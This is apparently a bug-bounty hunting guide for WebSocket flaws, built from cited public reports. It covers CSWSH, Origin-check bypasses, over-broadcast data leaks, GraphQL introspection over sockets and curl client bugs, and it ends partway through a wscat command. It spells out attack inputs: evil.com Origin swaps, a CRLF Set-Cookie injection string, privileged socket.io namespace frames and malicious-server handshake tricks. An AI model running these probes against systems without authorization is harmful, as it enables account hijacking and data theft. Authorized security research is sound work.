---
name: hunt-websocket
description: "Hunting skill for WebSocket vulnerabilities, built from 29 assigned reports of which 25 full disclosed reports were read (HackerOne / PortSwigger research / CVE / Internet Bug Bounty). Covers Cross-Site WebSocket Hijacking (CSWSH) and Origin-validation failure on the handshake (#211283, #274324, #178990, #931197 socket.io special-symbol bypass, #395729 browser-extension socket relay), missing per-message/per-subscription authorization and information disclosure over sockets (#1023669 Shopify Ping, #163464 Legal Robot, #168223 Instacart, #862835 GraphQL introspection via unauthenticated WS `start`), auth/CRLF bypass exposing WS dashboards (#1102780 Nextcloud), and the large client-side cluster where a malicious WS server attacks the client library (curl fragmentation/control-frame DoS #3303765/#3480039/#3168039, strcpy handshake overflow #2298307/#3392174, missing Sec-WebSocket-Accept verification and MITM session hijack #3474865/#3917775, predictable mask #3330839, use-after-free #4123749/#4124722, GnuTLS over-read #4099194, httpd lua read-beyond-bounds #1595290, mod_lua PING crash #103991). Also covers ws:// vs wss:// cleartext guidance (#3295652) and WS-post sanitization/#2541027. Use when the target exposes ws:// or wss:// endpoints, socket.io / SockJS / SignalR / Phoenix Channels / graphql-ws, real-time chat, dashboards, notifications, trading, or when auditing a WebSocket client/library implementation."
sources: hackerone_public, portswigger_research, cve, github, internet_bug_bounty
report_count: 29
full_reports_read: 25
---

# HUNT-WEBSOCKET — WebSocket Security

## Crown Jewel Targets

WebSocket bugs are highest-value when the socket carries **authenticated, per-user, real-time data** or when the WS **handshake is the only authentication boundary**. The 25 full reports cluster into five high-value families:

- **CSWSH / Origin-validation failure** — a cookie-authenticated handshake with no per-connection CSRF token and no Origin enforcement. Legal Robot's own reporters stated "Since almost all the request in the site are performed in web socket, it might be possible to hijack the websocket. The impact would be similar to side-wise CSRF plus every response from server could be possible to be read by attacker" (#211283). That is the maximal blast radius: the socket *is* the application transport.
- **socket.io origin-protection bypass** — `io.origins(['http://localhost:80'])` defeated with special symbols `` ` `` and `$` that Firefox accepts in domain names (#931197, CVSS 8.1). Any WS stack with a string-based Origin allowlist is a candidate.
- **Missing message/subscription authorization & over-broadcast** — a low-privileged principal registers to events or simply monitors frames and receives other users' data: Shopify Ping staff listening to customer conversations (#1023669), Legal Robot/Instacart streaming `email` and `user_id` to the client (#163464, #168223).
- **GraphQL-over-WebSocket auth gaps** — introspection queries passed inside `{type:"start", payload:{query:"query IntrospectionQuery{...}"}}` over an *unauthenticated* WS (#862835), and GraphQL WS subscriptions used as a cross-tenant event bus (#1023669).
- **Client-side WS stack bugs (malicious-server model)** — when the target is a WS *client* or library (curl, Node `ws`, Apache httpd `mod_lua`), a hostile server attacks it during handshake or frame parsing: `strcpy` handshake overflow (#2298307, #3392174), any `Sec-WebSocket-Accept` accepted enabling MITM hijack (#3474865, #3917775), fragmentation/control-frame DoS (#3303765, #3480039, #3168039), UAFs (#4123749, #4124722), heap over-read (#1595290, #4099194), predictable masking key (#3330839), PING recursion crash (#103991).

**Highest-value chains:**
- **CSWSH → session/refresh token in stream → ATO** — require proof the attacker-origin socket received a *different* victim's data; a bare `101` is not a finding.
- **Over-broadcast WS → cross-tenant exfil** — subscribe/join as a low-priv user and capture `42` events or raw frames containing another tenant's PII or tokens.
- **GraphQL-over-WS introspection → full API map → deeper auth attacks** (#862835).
- **Handshake parser bug → memory corruption / MITM** — full control of `Sec-WebSocket-Key`/`Sec-WebSocket-Accept`/frame length fields (#3392174, #3474865).
- **Cleartext `ws://` → sniff and replay** — reporters explicitly demonstrated traffic "sniffed with Chrome ... and replayed elsewhere (cross-domain)" (#178990); compare #3295652's `ws://`-in-docs finding.

Payouts in this pack are mostly undisclosed; the one explicit bounty is **$150** (#2541027). Severity spans Critical-class origin/CSWSH issues (CVSS 8.1–8.6) down to Low memory-safety/DoS issues. Do not inflate: report the severity the evidence supports.

### Severity calibration from the 25 reports

| Finding family | Representative IDs | Pack severity | What the evidence must show |
|---|---|---|---|
| CSWSH / Origin-validation failure | #211283, #274324, #178990, #931197, #395729 | High (CVSS 8.1 for #931197) / Medium | Attacker-origin socket actually reads or sends victim data; a foreign-Origin `101` alone is not enough |
| Access-control / CRLF bypass exposing WS | #1102780 | High | Unauthenticated dashboard and WS endpoint reachable, with disclosed data |
| Cross-tenant subscription / info disclosure | #1023669, #163464, #168223, #1595290 | Varies (Low–High) | Frames containing another principal's PII/conversations, or heap bytes |
| GraphQL-over-WS introspection / unauthorized ops | #862835 | Medium (CVSS 6.1) | Schema dump or unauthorized operation returned from a `start`/subscription frame |
| Handshake memory corruption / MITM | #2298307, #3392174, #3474865, #3917775, #4123749, #4124722 | High (CVSS 8.6) to Low | Crash, ASan trace, injected frames, or verifiable MITM hijack |
| Frame/resource DoS | #3303765, #3480039, #3168039, #103991 | Medium / Low | OOM, hang, connection drop, or recursion crash reproduced reliably |
| WS-post sanitization | #2541027 | low / $150 | Unsanitized content persisted through the WS-to-REST path |
| Insecure transport guidance | #3295652 | High | Documented `ws://` usage that enables sniff/replay (#178990 demonstrates the impact) |

### What makes a WS finding a "crown jewel" rather than noise

Real findings in this pack all share one trait: the researcher demonstrated a **concrete victim loss**, not merely an odd socket behavior.

- **Data crosses a trust boundary.** #163464 and #168223 are valuable because "the account information of many users, including email address, is sent to the client" — data left the server's trust boundary to an untrusted endpoint.
- **The transport *is* the application.** #211283's "Since almost all the request in the site are performed in web socket" means every HTTP-style CSRF becomes a WS hijack with bidirectional read.
- **A check exists but is defeatable.** #931197 is stronger than a plain no-Origin bug because a real `io.origins([...])` allowlist was bypassed with special symbols.
- **The bug is in a widely used dependency.** curl and socket.io findings multiply across every downstream consumer; #931197 notes 3,457,682 weekly downloads.

Hunt for the boundary crossing first, then prove it. A socket that merely opens from a foreign Origin, echoes your own frame, or accepts a frame it silently ignores is noise until Gate 0 is satisfied.

---

## Attack Surface Signals

### Endpoint & Path Patterns to Hunt
```
/ws                  /websocket           /sockjs/*/websocket
/socket.io/                                /signalr/negotiate
/socket.io/?EIO=4&transport=polling        /cable
/graphql             /api/v1/signshow      /admin/internal
/realtime            /stream               /events
/notifications       /chat                 /live
/trade               /*/subscribe          /*/events
?shop_id=            ?token=               ?sid=
```

### Client-Side JS Patterns (source review)
```javascript
new WebSocket("wss://...")          // raw WS handshake URL
io() / io.connect() / socket.io     // socket.io / Engine.IO
new SockJS(...)                     // SockJS fallback transport
signalr / HubConnectionBuilder      // ASP.NET SignalR
Phoenix.Socket / phx_join           // Phoenix Channels
graphql-ws / subscriptions-transport-ws  // {"type":"start","payload":{...}}
window.Meteor / sockjs/*/websocket  // Meteor SockJS (#211283, #178990)
extension background "socket" command with attacker-set url (#395729)
```

### Handshake Header Signals (read the 101 request in Burp)
```
Origin: https://<app>.example.com        <- is it enforced at all?
Cookie: session=...                      <- ambient credential = CSWSH precondition
Sec-WebSocket-Key: <base64>              <- parser/overflow target (#2298307/#3392174)
Sec-WebSocket-Version: 13                <- 777/426 = smuggling probe
Sec-WebSocket-Accept: <value>            <- client must verify it (#3474865/#3917775)
Sec-WebSocket-Extensions: permessage-deflate
Upgrade: websocket / Connection: Upgrade <- mismatch = handshake desync
wss://  vs  ws://                        <- cleartext finding (#3295652, #178990)
```

### Framework / Stack Signals
- **socket.io / Engine.IO** — `EIO=3/4` `sid=` reuse, namespace via `40/nsp,` packet, special-symbol origin bypass (#931197).
- **GraphQL WS transports** — `graphql-ws`, `subscriptions-transport-ws`, Apollo subscriptions (#862835, #1023669).
- **Meteor / SockJS** — `["{\"msg\":\"method\",\"method\":\"login\",...}"]` frames replayed cross-domain (#178990).
- **Browser extensions with a message-driven socket relay** — content script → background page → `new WebSocket(e.url)` (#395729).
- **C / C++ WS libraries and clients** — curl `lib/ws.c`, Apache `mod_lua`, Node `ws`, GnuTLS backends. Public source review repeatedly located the exact vulnerable line (#2298307 at `strcpy`, #3392174 at `lib/ws.c:1287`, #3330839 at `lib/ws.c#L1340`, #4123749 at `lib/ws.c:503`, #4124722 at `lib/ws.c:1734`, #1595290 at `lua_websocket_readbytes()`).
- **Admin/internal dashboards behind auth or redirects** — CRLF `Set-Cookie` injection then websocket exposed in response (#1102780).

### Response / Behavioral Signals
- A `101 Switching Protocols` from a foreign `Origin` (candidate, not proof) (#274324).
- Different status for a valid vs malformed `Sec-WebSocket-Accept` (#3474865).
- Frames that keep arriving when you are not the data's owner (#163464, #168223, #1023669).
- Crash/heap bytes after malformed frame length `0x4000` with no payload (#1595290), PING recursion crash (#103991), OOM under continuation-frame flood (#3303765).
- Debug/ASan trace output naming `ws_dec_pass_payload`, `ws_flush`, or `curl_easy_pause` (#4123749, #4124722).
- Schema dump returned from a `{type:"start"}` frame (#862835).

### Protocol-level signals (RFC 6455 fields as attack surface)

The 25 reports show that both ends of the connection are attackable. Which side you test depends on what the target *is*:

```
HANDSHAKE (client -> server)          HANDSHAKE RESPONSE (server -> client)
GET /socketjs/431/.../websocket       HTTP/1.1 101 Switching Protocols
Host: app.example.com                 Upgrade: websocket
Origin: https://app.example.com       Connection: Upgrade
Cookie: session=...                   Sec-WebSocket-Accept: <base64>   <- must be verified
Sec-WebSocket-Key: <base64 nonce>     Sec-WebSocket-Version: 13
Sec-WebSocket-Version: 13             [426/400 on bad version -> smuggling]
Sec-WebSocket-Extensions: permessage-deflate
Upgrade: websocket / Connection: Upgrade

FRAMES (either direction)
FIN / opcode / MASK / payload len     <- fragmentation, control frames, declared length
0x4000 declared, zero bytes present   <- over-read (#1595290)
PING during large send                <- starvation / endless loop (#3480039, #3168039)
```

- **Server-side attack surface** — Origin, Cookie, `shop_id`, subscription/event names, GraphQL `start` payloads, and the message body. Dominant in #211283, #274324, #931197, #1102780, #1023669, #862835, #163464, #168223, #2541027.
- **Client-side attack surface** — `Sec-WebSocket-Key`, `Sec-WebSocket-Accept`, frame length, control-frame timing, TLS backend. Dominant in the curl/httpd cluster (#2298307, #3392174, #3474865, #3917775, #3303765, #3480039, #3168039, #3330839, #4123749, #4124722, #4099194, #1595290, #103991).

### Framework-specific tell-tales

| Framework | Fingerprint | Authz surface to test |
|---|---|---|
| socket.io / Engine.IO | `/socket.io/?EIO=3\|4&transport=polling`, `sid=`, frames prefixed `4` | namespace via `40/nsp,`, rooms via `42[...]`, Origin via `io.origins()` (#931197) |
| SockJS / Meteor | `/sockjs/<server>/<session>/websocket`, `msg:"method"` frames | connect/login replay cross-origin (#211283, #178990) |
| graphql-ws / subscriptions-transport-ws | `wss://.../graphql`, `connection_init`, `start` | introspection, subscriptions, token binding (#862835, #1023669) |
| ASP.NET SignalR | `/<hub>/negotiate` then WS upgrade | hub method-level authorization |
| Phoenix Channels | `phx_join` to `topic:subtopic` | `join/3` topic authorization |
| Browser extension relay | content-script message → background `new WebSocket(e.url)` | arbitrary destination + ambient cookies (#395729) |
| C/C++ clients | `lib/ws.c`, `mod_lua`, GnuTLS/OpnSSL backends, `curl -T` | handshake fields, frame parsing, TLS send path |

### Cleartext and replay signals

`ws://` in a bundle or in official docs is not automatically a finding, but the pack shows it is a real risk: #3295652 reported "official documentation and example code that demonstrate WebSocket connections using the insecure ws:// protocol instead of the secure wss://," while #178990 demonstrated that "The traffic from and to the websocket can be sniffed with Chrome (see attachment), and replayed elsewhere (cross-domain)." If you find `ws://`, escalate to a replay/sniffing PoC before reporting.

---

## Discovery Patterns From 25 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **Browser DevTools → Network → WS tab, and simply "monitoring the websocket requests."** This is the single most productive starting point in the pack: it produced #163464 ("I noticed when monitoring the websocket requests that the account information of many users, including email address, is sent to the client") and #168223 ("user_id is sent to the client"). *What to look for:* frames that carry data belonging to users other than the logged-in account; emails, IDs, tokens, full names in plaintext JSON; high-volume repeated frames.
2. **Burp Suite WebSockets history / proxy intercept of the handshake.** *What to look for:* the exact `GET .../websocket HTTP/1.1` upgrade request, the `Origin`, `Cookie`, and `Sec-WebSocket-*` headers, and the `101` response. #274324's reporter "Intercept the websocket request with burpsuite like i've intercepted and send it to repeater," then swapped in a malicious Origin.
3. **JS bundle source review for socket construction.** *What to look for:* `new WebSocket`, `io(`, `socket.io`, `SockJS`, `signalr`, `Phoenix.Socket`, hardcoded ws/wss URLs, token/sid in the URL. This is how #395729 found the extension background handler `t = new u(e.url) // <-- e.url is under attacker's control` and how #931197 mapped `io.origins([...])`.
4. **socket.io polling handshake for version + sid fingerprinting.** *What to look for:* `GET /socket.io/?EIO=4&transport=polling` leaks Engine.IO version and a session `sid`; #931197 used `EIO=3`. Old `socket.io` 2.3.0 had the origin bypass. Probe forged `sid=` against polling next.
5. **GraphQL-over-WS endpoint discovery.** *What to look for:* a `wss://.../graphql` endpoint and whether a `{type:"connection_init", payload:{Authorization:"..."}}` or `{type:"start", payload:{query:"..."}}` frame is accepted unauthenticated. #862835 dumped the full schema this way; #1023669 used `wss://argus.shopifycloud.com/graphql?shop_id={id}` plus an `argus token` lifted from `GetToken`.
6. **Public code / dependency source review.** *What to look for:* exact unsafe calls in published source. #2298307 and #3392174 found `strcpy(keyval, randstr)` in curl's WS handshake; #3330839 found the fixed mask at `lib/ws.c#L1340`; #931197 was found "while testing one of the private bugbounty programs" against a specific npm module version.
7. **API/directory enumeration of admin surfaces that expose a socket.** *What to look for:* CRLF / redirect bypasses that reveal an otherwise-hidden WS endpoint. #1102780: `//%0d%0aSet-Cookie:%20crlf-injection=mickeybrew//` redirected to a dashboard, then "Show the network-browser and you can found api directory and websocket ... `https://support.nextcloud.com/api/v1/signshow`."
8. **Browser-extension message-handler audit.** *What to look for:* content-script messages that reach a privileged background page and can set a socket URL or send arbitrary frames (#395729 `case "connect"` → `m._refreshUser(...)` → `a.send(e.arg)`).
9. **Non-standard ports / service discovery.** *What to look for:* WS listeners on 3000/3001/8080/8443/8888/9000 and internal hosts reached via WS tunneling (#1023669's `wss://argus.shopifycloud.com`, #395729's "to any URL").
10. **Malicious-server / client-library testing.** *What to look for:* when the target is a WS *client*, stand up your own WS server and control the handshake response and frames: wrong `Sec-WebSocket-Accept` (#3474865), fragmented FIN=0 + continuation flood (#3303765), timed PING during send (#3480039, #3168039), oversized base64 key (#2298307), `curl -T <file> wss://...` upload (#4099194).
11. **Debug, trace, and error output.** *What to look for:* ASan traces, verbose logs, and memory dumps that name the faulty function — `lua_websocket_readbytes()` copying `0x4000-1` bytes of heap (#1595290), `ws_dec_pass_payload()` (#4123749), `ws_flush()` (#4124722).

**Recon surface priority matrix** — rank your effort by how often each surface actually produced a report in this pack:

| Rank | Recon surface | Reports it fed | First signal you will see |
|---|---|---|---|
| 1 | Live WS frame monitoring (DevTools / Burp) | #163464, #168223, #1023669 | Foreign PII / conversation data in frames |
| 2 | Handshake intercept + Repeater | #274324, #211283, #178990 | `101` from a malicious Origin |
| 3 | JS bundle source review | #395729, #931197, #3295652 | `new WebSocket(e.url)`, `io.origins(...)` |
| 4 | socket.io polling / version fingerprint | #931197 | `EIO=3`, `sid=`, 2.3.0 version |
| 5 | GraphQL-over-WS probing | #862835, #1023669 | `connection_init`/`start` accepted unauthenticated |
| 6 | Public code / dependency review | #2298307, #3392174, #3330839, #4123749, #4124722 | `strcpy`, fixed mask, UAF callback |
| 7 | API/directory enumeration + CRLF/redirect | #1102780 | Hidden dashboard and `/api/v1/signshow` |
| 8 | Browser-extension handler audit | #395729 | Content-script-controlled socket URL |
| 9 | Malicious-server client testing | curl cluster (10 reports) | Wrong Accept accepted, OOM, hang, ASan trace |
| 10 | Error/debug/trace output | #1595290, #4123749, #4124722 | Heap bytes, sanitizer stack trace |

### Feature-Based Discovery Signals (frequency-ranked table — why it matters / what to probe)

| Signal (reports) | Why it matters | What to probe |
|---|---|---|
| **websocket (25)** | Every full report is a WS bug; the surface itself is the finding class. | Enumerate all ws/wss endpoints, frames, handshake headers, and the auth model. |
| **internal-network (10)** | WS often tunnels into internal hosts/APIs (argus, admin panels, loopback services). | Test arbitrary `url`, `shop_id`, and internal host framing; check what the socket can reach internally. |
| **api-endpoint (7)** | Sockets attach to REST/GraphQL APIs; an API bypass exposes the socket. | Map `/api/v1/*`, `GetToken` responses, and WS upgrade paths next to API routes (#1102780, #1023669). |
| **search-filter-sort (6)** | Input shaping/regex in proxy or filter code is where origin and parser checks live. | Vary Origin strings, header case, and special symbols; fuzz filter inputs (#931197, #395729). |
| **session-attack (6)** | Sessions/session fixation via `sid`, replay, and cross-domain socket reuse. | Replay captured frames, forge polling `sid`, test cookie-only auth (#178990, #2298307). |
| **public-code-search (6)** | Exact vulnerable lines were found in public source. | Grep the library's repo for `strcpy`, `memcpy`, mask generation, pause/debug callbacks. |
| **debug-error-leak (6)** | Traces and errors disclose the vulnerable path and heap contents. | Read verbose/ASan output; look for over-read bytes in responses (#1595290, #4099194). |
| **import-feature (5)** | Client sockets accept uploaded/imported data and attacker-controlled URLs. | Feed malformed frames and large payloads through the import/send path (#3303765, #3480039). |
| **base64-encoding (5)** | The handshake `Sec-WebSocket-Key` is base64 and was the overflow input. | Send oversized base64 keys/nonces to `strcpy` sinks (#2298307, #3392174). |
| **dos-resource (4)** | Frame/control-frame handling can exhaust memory/CPU. | Fragment flood, PING starvation, timed PING endless loop (#3303765, #3480039, #3168039). |
| **filter-bypass (4)** | Origin allowlists and version checks can be slipped. | Backtick/`$` symbols, header desync, permissive version (#931197, #862835). |
| **blind-oob (4)** | Some effects (UAF, over-read) need a listener or crash signal to confirm. | Use OAST/ASan; watch for callback or sanitizer proof (#4123749, #4124722). |
| **image-processing (3)** | Uploaded/streamed binary data crosses WS send buffers. | Test `curl -T` uploads and binary frame overreads (#4099194, #3330839). |
| **time-based (3)** | Frame timing triggers logic failures. | Timing PING against large sends; short keep-alive servers (#3480039, #3168039). |
| **cookie-handling (3)** | Cookies are the ambient credential for CSWSH and CRLF bypass. | Inject `Set-Cookie` CRLF; confirm cookie-only handshake (#1102780, #274324). |
| **js-source-review (3)** | Client code reveals attacker-controlled socket URLs. | Trace message handlers to `new WebSocket(...)` and `.send()` (#395729, #931197). |
| **proxy-feature (3)** | Proxies/relays relay attacker-chosen WS destinations. | Test "connect to any URL" and proxying to internal hosts (#395729, #931197). |
| **csrf (3)** | CSWSH is CSRF-on-the-socket; no CSRF token = exploitable cross-site. | Confirm no token in URL/protocol/first frame (#211283, #178990, #931197). |
| **graphql (2)** | GraphQL-over-WS is an auth and introspection surface. | Send `start` introspection; register subscriptions as low-priv (#862835, #1023669). |
| **cors-misconfig (2)** | CORS assumptions leak into WS origin handling. | Test cross-origin WS open + data read (#862835, #395729). |
| **server-side-rendering (2)** | Rendered pages/templates can embed socket endpoints or tokens. | Check rendered dashboard responses for WS URLs and tokens (#1102780, #178990). |
| **admin-internal (2)** | Admin surfaces commonly host the WS endpoint. | Reach admin with a permissionless account; enumerate its sockets (#1023669, #1102780). |
| **template-injection (2)** | User content in templates reaches WS/HTTP code paths. | Inject template/JSON content into WS posts and observe downstream rendering (#2541027, #931197). |
| **cache-layer (2)** | Caching/reuse of sockets or masks changes behavior. | Reuse `sid`/mask and check for state confusion (#274324, #3330839). |
| **graphql-technique (1)** | GraphQL-specific query/introspection mechanics apply over WS. | Craft `IntrospectionQuery` inside a `start` payload (#862835). |
| **redirect-handling (1)** | Redirects expose otherwise hidden WS endpoints. | Follow the CRLF/redirect chain and inspect network tab (#1102780). |
| **request-smuggling (1)** | Handshake desync tunnels requests past the proxy. | Test bad version / Connection mismatch with differential probes (#1102780 technique tags, Phase 9). |
| **open-redirect (1)** | Open redirect plus WS discovery broadens reach. | Redirect to dashboard then enumerate sockets (#1102780). |
| **misconfiguration (1)** | Plain misconfiguration is a valid WS bug class. | Unauthenticated introspection over WS (#862835). |
| **case-variation (1)** | Case changes slip string filters. | Vary Origin/header case and URL scheme case (#395729). |
| **subdomain (1)** | Origin allowlists that trust a subdomain are bypassable. | Use a lookalike subdomain in Origin (#931197). |
| **dependency-confusion (1)** | A vulnerable third-party module version is the bug. | Pin and test the exact module version (#931197, socket.io 2.3.0). |
| **unicode-normalization (1)** | Length/count mismatches around decoded characters. | Declare large payload length with malformed content (#1595290). |
| **xml-parser (1)** | Parser assumptions leak into socket framing. | Test malformed structured frames (#274324 technique tags). |
| **comment-injection (1)** | Injected markup/characters alter parsing. | Inject comment-like sequences into Origin/frames (#274324 technique tags). |
| **idor-object-ref (1)** | Object references in frames are not re-authorized. | Change `shop_id`/`userId`/channel IDs in frames (#1023669, #274324 tags). |
| **link-preview (1)** / **url-fetching (1)** | WS posts trigger server-side link fetching. | Post URLs over WS and watch for metadata/SSRF-like fetches (#2541027). |
| **json-body (1)** | WS messages are JSON, so JSON parsing/validation applies. | Fuzz JSON keys/types in frames (#2541027, #862835). |
| **cloud-metadata (1)** | Link-preview metadata tags hint at cloud context. | Correlate WS-triggered fetches with cloud metadata reach (#2541027 tags). |
| **file-upload (1)** / **export-feature (1)** | Upload/export paths cross the WS send buffer. | Use `curl -T <file> wss://...` and large exports (#4099194). |
| **path-traversal-lfi (1)** | Path handling around uploaded files and WS endpoints. | Probe file/path inputs that feed the send path (#4099194 tags). |

### Verbatim Discovery Clues (all real `[#id]` lines from the pack)

The following are copied verbatim from the study pack's "DISCOVERY CLUES" and report excerpts — these are the researchers' own "how I found it" words. Each is attributed to its real HackerOne ID:

1. [#163464] "I noticed when monitoring the websocket requests that the account information of many users, including email address, is sent to the client."
2. [#168223] "I noticed when monitoring the websocket requests that the account information of user, including user_id is sent to the client."
3. [#1102780] "I found a information disclosure for bypassing parameter url attacker can redirect to dashboard without login user/pass page"
4. [#1102780] "Show the ``network-browser`` and you can found api directory and websocket" — and "Directory websocket is https://support.nextcloud.com/api/v1/signshow ... Opened it and **Boom** You can see Information disclosure through websocket"
5. [#931197] "I found this vulnerability while testing one of the private bugbounty programs."
6. [#931197] "io` (During my small research I identified that firefox allows $ in domains names)." — the basis of the `` ` ``/$ origin bypass against `io.origins(['http://localhost:80'])`
7. [#1595290] "I have found a read-beyond-bounds bug in lua_websocket_readbytes() that permits an attacker to exfiltrate a controllable amount of heap data if the victim site runs a suitable LUA program."
8. [#211283] "The given URL fails to validate Origin header- leading to Cross-Site WebSocket Hijacking." and "Since almost all the request in the site are performed in web socket, it might be possible to hijack the websocket. The impact would be similar to side-wise CSRF plus every response from server could be possible to be read by attacker."
9. [#274324] "In the below web-socket request successful 101 protocol handshake is working with the origin:https://app.legalrobot.com, but if you place the malicious origin in the place of https://thisdata.com which is http://evil.com or any page containing the malware, the web socket server is still giving 101 p..."
10. [#178990] "'Cross-Site WebSocket Hijacking' is possible, because the websocket connection is not secure (enough). The traffic from and to the websocket can be sniffed with Chrome (see attachment), and replayed elsewhere (cross-domain)."
11. [#862835] "It is possible to execute GraphQL introspection query through unauthenticated WebSocket connection. PoC included." and "The problem occurs because of the websocket request with type `start`(maybe others too, I didn't check) allows to pass introspection query in it"
12. [#1023669] "By registering to a few different Shopify Ping Websocket Events on the `wss://argus.shopifycloud.com/graphql?shop_id={id}` endpoint, a staff without any permission can listen to conversions with customers."
13. [#395729] "Attacker could trigger Grammarly extension's `socket` command using a crafted page to perform WS connection(and data sending) from extension's background page (with cookies and origin) to any URL."
14. [#2298307] "I would like to report a potential security vulnerability in the WebSocket handling code of the curl library. The issue is related to the usage of the `strcpy` function, which can lead to a buffer overflow if the length of the input is not properly checked." — with step "Provide a base64-encoded nonce value that exceeds the buffer size."
15. [#3474865] "libcurl upgrades to WebSocket without validating Sec-WebSocket-Accept, allowing a spoofed 101 response to complete the handshake and inject frames"
16. [#3303765] "A malicious WebSocket server can send a fragmented message (FIN=0) followed by a flood of continuation frames, causing the client (curl) to continuously allocate memory while waiting for message completion."
17. [#103991] "A stack recursion crash in the mod_lua module was found. A Lua script executing the r:wsupgrade() function could crash the process if a malicious client sent a carefully crafted PING request."
18. [#4099194] "When curl is built with GnuTLS, a malicious WebSocket server can make `curl -T <file> wss://...` send memory past curl's WebSocket send buffer."
19. [#3330839] "The curl WebSocket implementation generates a fixed masking key at the beginning of a connection an re-uses it for every frame"
20. [#1595290] "It creates a TLS connection to httpd, asks to upgrade the connection to websocket, then sends a websocket frame that purports to transfer `0x4000` bytes of payload ... However, the frame does not actually include any payload."
21. [#3480039] "libcurl fails to prioritize PONG responses when it is actively sending a large stream of data via curl_ws_send. If payload_remain > 0, the PONG response is queued behind the user data."
22. [#4123749] "At `lib/ws.c:503`, `ws_dec_pass_payload()` holds a pointer into the WebSocket receive queue while passing a frame to the application's write callback."
23. [#4124722] "At `lib/ws.c:1734`, `ws_flush()` borrows a pointer from the outgoing `sendbuf` and passes it to `ws_send_raw_blocking()`; it skips those bytes only after the send returns."
24. [#3295652] "The curl source repository contains official documentation and example code that demonstrate WebSocket connections using the insecure ws:// protocol instead of the secure wss://."

### Probe Checklist (15 concrete probes)

1. Open DevTools → Network → WS on two accounts and diff the frames for cross-account data (the #163464/#168223 method).
2. Replay the handshake with `Origin: http://evil.com` in Burp Repeater and note whether a `101` still comes back (#274324) — candidate only.
3. Repeat the Origin test with special symbols `` ` `` and `$` in the Origin value (the exact #931197 socket.io bypass).
4. Confirm the handshake uses only a cookie (`Cookie: session=...`) with no `?token=`/subprotocol/first-frame nonce — the CSWSH precondition (#211283, #178990).
5. Host an attacker-origin HTML PoC and verify you **receive the victim's data**, exfiltrated to OAST — never claim CSWSH on a `101` alone.
6. Send a GraphQL-over-WS `{type:"start", payload:{query:"query IntrospectionQuery{...}"}}` frame without auth and check for a schema dump (#862835).
7. With a low-priv/permissionless account, copy the `argus token` from `GetToken` and register WS events; look for other users' conversations (#1023669).
8. Probe `GET /socket.io/?EIO=4&transport=polling` for version + `sid`; then try a forged/victim `sid` against the polling transport.
9. Attempt `40/admin,` (Engine.IO `4` MESSAGE + socket.io `0` CONNECT) as a low-priv user; then `42["subscribe",{"channel":"admin_events"}]` — never use the bogus `?nsp=/admin` param.
10. Test a CRLF `Set-Cookie` injection in a redirect/URL parameter and see whether a dashboard and WS endpoint become visible (#1102780).
11. Trace any browser-extension content-script "socket"/"connect" message to a background `new WebSocket(e.url)` and try supplying your own URL (#395729).
12. Stand up a malicious WS server returning `Sec-WebSocket-Accept: WRONGKEY` plus a text frame; see whether the client still upgrades and processes frames (#3474865, #3917775).
13. Send a FIN=0 fragmented frame followed by a flood of continuation frames; watch the client's memory (#3303765).
14. Send timed PINGs during a large send and a PING with no matching PONG; look for hangs/crashes/drops (#3168039, #3480039, #103991).
15. Review library source for `strcpy`, unbounded `memcpy`, fixed mask reuse, and pause/debug-callback paths; then target them with oversized base64 keys and pause-triggered callbacks (#2298307, #3392174, #1595290, #3330839, #4123749, #4124722).

**What a positive probe result looks like (and what it does not):**

| Probe | Positive | False positive |
|---|---|---|
| #2 / #3 Origin swap | `101` **plus** victim data delivered to attacker origin | `101` with no data or an immediate close |
| #4 token check | Only `Cookie:` on the handshake | `?token=`, bearer subprotocol, or first-frame nonce present |
| #5 cross-account PoC | OAST log with the planted marker from the victim account | Your own account's echoed data |
| #6 GraphQL `start` | Full `__schema` response | Introspection disabled / error response |
| #7 event registration | Another user's conversation frames | Empty event stream |
| #8 `sid` forge | `200` resuming a victim's stream | `400 "Session ID unknown"` (the expected safe answer) |
| #9 namespace connect | `40/admin,` success **plus** foreign `42` event data | A `40` ack with no subsequent privileged data |
| #12 wrong Accept | Client upgrades and processes the injected frame | Client rejects the handshake (the safe behavior) |
| #13 fragmentation | Memory climbs continuously, OOM | Frame cleanly rejected or bounded |
| #14 PING timing | Hang, crash, or keep-alive drop reproduced | Client answers PONG promptly |

Record a negative control for each probe. The pack's reporters often stated the *safe* behavior explicitly — e.g. #931197 noted changing Origin to `something.io` produced `HTTP/1.1 400 Bad Request` "and it is good" — and a real report benefits from contrasting the bypass with that control.

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover & inventory every WS endpoint
```bash
# Grep JS bundles for WS connection code (JS-source-review signal, 3 reports)
grep -rE "new WebSocket|io\(|io\.connect|socket\.io|new SockJS|signalr|Phoenix\.Socket|wss?://" \
  recon/$TARGET/ --include="*.js" 2>/dev/null | \
  grep -oE "(wss?://[^'\"]+|/[a-zA-Z0-9/_.-]*socket[^'\"]*|/signalr[^'\"]*|/cable\b)" | sort -u

# Crawl URLs for realtime hints
grep -iE "socket|/ws\b|websocket|stream|realtime|live|chat|events|/cable|/signalr|graphql|notifications" \
  recon/$TARGET/urls.txt | sort -u

# Probe a candidate upgrade (101 = upgrade supported)
curl -sI -o /dev/null -w "%{http_code}\n" \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)" \
  "https://$TARGET/ws"

# socket.io polling handshake (version + sid)
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo
```
In Burp Pro, browse the app then read `get_proxy_websocket_history` (and the WebSockets tab) to enumerate live sockets, message schemas, and which frames carry auth-sensitive data. This reproduces the pack's most common discovery act: "monitoring the websocket requests."

### Phase 2 — Fingerprint the stack and version
Read the `EIO=` value, `Server` header, and client bundle version. Old `socket.io` 2.3.0 carried the origin bypass (#931197). Old curl builds (`lib/ws.c` before the relevant fixes) carried the handshake and frame bugs (#2298307, #3392174, #3330839). Flag every `ws://` URL as a cleartext candidate (#3295652, #178990).

### Phase 3 — Map the handshake authentication model (CSWSH preconditions)
CSWSH needs **three** conditions together: (a) ambient credential (cookie sent automatically), (b) no unpredictable per-connection token, (c) no Origin enforcement. In DevTools → Network → WS → Headers, look for `Cookie: session=...` **and the absence** of `?token=`, a bearer subprotocol, or a first-frame nonce. If a unique token rides the handshake, CSWSH is not cross-site exploitable — downgrade or drop.

### Phase 4 — Probe Origin enforcement, then PROVE CSWSH
```bash
wscat -c "wss://$TARGET/ws" \
  --header "Origin: https://evil.com" \
